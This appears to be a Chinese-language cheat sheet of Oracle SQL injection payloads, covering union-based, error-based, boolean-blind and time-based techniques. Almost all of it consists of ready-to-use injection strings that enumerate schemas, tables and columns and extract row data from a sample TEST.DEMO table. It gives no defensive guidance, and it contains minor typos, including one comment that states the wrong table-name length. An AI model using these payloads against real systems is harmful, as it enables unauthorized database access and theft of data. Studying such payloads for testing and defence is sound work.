SQL注入

一：联合注入

判断注入类型
id=1'"\							//判断闭合
id=1 and 1=1 --					//判断注入
id=1 and 1=0 --
爆字段
id=1 order by 4 --
查看回显字
id=-1 union select null,null,null,null from dual --			
//前后的数据类型要相同 ，所以回显位可以用unll来代替

查看当前数据库
id=1 union select SYS_CONTEXT('USERENV','CURRENT_USER'),null,null from dual--	
//查看当前数据库
查看有多少个数据库
id=-1 union select count(distinct(owner)),null,null from sys.all_tables--
子查询遍历数据库
-1 union select null ,owner,null,null from (select owner,rownum as limit from (select distinct(owner) from all_tables))where limit =1--				//将所有的数据库建立一个虚假的表通过limit进行x限制排序

子查询遍历表名
-1 union select null ,table_name,null,null from (select table_name,rownum as limit from (select table_name from all_tables where owner='TEST')) where limit =1 --
//all_tables表中储存着所有的数据库名和表名

子查询遍历字段名
//user_tab_columns储存所有的字段
-1 union select null ,column_name,null,null from (select column_name,rownum as limit from (select column_name from user_tab_columns where table_name='DEMO')) where limit =1 --

查询字段数据
-1 union select  ID,null,null,null from TEST.DEMO where ROWNUM =1 and ID not in(3,1)--		//只能查询一个字段数据
    
    
//子查询多个字段数据 
-1 union select null,ID||chr(126)||NAME||chr(126)||AGE||chr(126)||SEX,null,null  from  TEST.DEMO --			//查看一组字段数据
 
-1 union select null,hua,null,null  from (select hua,rownum as limit from (select ID||chr(126)||NAME||chr(126)||AGE||chr(126)||SEX as hua from TEST.DEMO)) where limit =1 --  		//遍历每组的字段数据

二：报错注入

判断注入类型
id=1'"\							//判断闭合
id=1 and 1=1 --					//判断注入
id=1 and 1=0 --
查看当前数据库
id=1 and (SELECT dbms_xdb_version.checkin(  SYS_CONTEXT('USERENV', 'CURRENT_USER') ) FROM DUAL) is not null--

遍历所有数据库
1 and (SELECT dbms_xdb_version.checkin((SELECT OWNER FROM (SELECT OWNER,ROWNUM AS LIMIT FROM (SELECT DISTINCT(OWNER) FROM SYS.ALL_TABLES)) WHERE LIMIT = 2)) FROM DUAL) is not null--
//改变limit的值遍历所有数据库名

遍历所有表
d=1 and (SELECT dbms_xdb_version.checkin((SELECT TABLE_NAME FROM (SELECT TABLE_NAME,ROWNUM AS LIMIT FROM (SELECT TABLE_NAME FROM sys.all_tables WHERE OWNER = 'TEST')) WHERE LIMIT = 1)) FROM DUAL) is not null--
//改变limit的值遍历TEST数据库所有表名

遍历所有字段
id=1 and (SELECT dbms_xdb_version.checkin((SELECT COLUMN_NAME FROM (SELECT COLUMN_NAME,ROWNUM AS LIMIT FROM (SELECT COLUMN_NAME FROM sys.user_tab_columns WHERE TABLE_NAME = 'DEMO')) WHERE LIMIT = 1))  FROM DUAL) is not nul--
//改变limit的值遍历DEMO数据库所有表名

遍历每组的字段数据
id=1 and (SELECT dbms_xdb_version.checkin((SELECT DATA FROM (SELECT DATA, ROWNUM AS LIMIT FROM (SELECT ID||chr(126)||NAME||chr(126)||AGE||chr(126)||SEX AS DATA FROM  TEST.DEMO)) WHERE LIMIT = 1))  FROM DUAL) is not null --

三：bool盲注

判断注入类型
id=1'"\							//判断闭合
id=1 and 1=1 --					//判断注入
id=1 and 1=0 --
判断数据库长度
id=1 and (select length(owner) from (select owner,rownum as limit from (select distinct(owner) from all_tables)) where limit = 1)>11	//通过页面返回的结果判断数据库的长度    

id=1 and (select length(owner) from (select owner,rownum as limit from (select distinct(owner) from all_tables)) where limit = 1)=11		
//页面返回正常第一个数据库的长度为11

判断数据库的名字
id=1 and (select ascii(substr(owner,1,1)) from (select owner,rownum as limit from (select distinct(owner) from all_tables)) where limit = 1)>65
 //判断第一个数据库名的第一个字母

后续依次爆出数据库名

判断表名长度
id=1 and (select length(table_name) from (select table_name,rownum as limit from (select distinct(table_name) from all_tables where owner ='TEST')) where limit = 1)=4
//TEST数据库的第一个表的长度为4

判断表名
id=1 and (select ascii(substr(table_name,1,1)) from (select table_name,rownum as limit from (select distinct(table_name) from all_tables where owner ='TEST')) where limit = 1)>50
//TEST数据库的第一个表的第一个字母

四：时间盲注

判断注入类型
id=1'"\							//判断闭合
id=1 and 1=1 --					//判断注入
id=1 and 1=0 --
判断数据库长度
id=1 and (CASE WHEN (select length(owner) from (select owner,rownum as limit from (select distinct(owner) from all_tables)) where limit = 1)=11 THEN DBMS_PIPE.RECEIVE_MESSAGE(123, 5) ELSE 1 END)=1		
// 页面延时5秒后刷新，第一个数据库的长度为11

判断数据库名
id=1 and (CASE WHEN (select ascii(substr(owner,1,1)) from (select owner,rownum as limit from (select distinct(owner) from all_tables)) where limit = 1)>65 THEN DBMS_PIPE.RECEIVE_MESSAGE(123, 5) ELSE 1 END)=1		
// 页面延时5秒后刷新，第一个数据库名的第一个字母为A
判断表的长度
id=1 and (CASE WHEN id=1 and (select length(table_name) from (select table_name,rownum as limit from (select distinct(table_name) from all_tables where owner ='TEST')) where limit = 1)=4 THEN DBMS_PIPE.RECEIVE_MESSAGE(123, 5) ELSE 1 END)=1
//  页面延时5秒后刷新，第一个数据库第一个表的长度为11
判断表名
id=1 and (CASE WHEN id=1 and (select ascii(substr(table_name,1,1)) from (select table_name,rownum as limit from (select distinct(table_name) from all_tables where owner ='TEST')) where limit = 1)>50 THEN DBMS_PIPE.RECEIVE_MESSAGE(123, 5) ELSE 1 END)=1
 //TEST数据库的第一个表的第一个字母
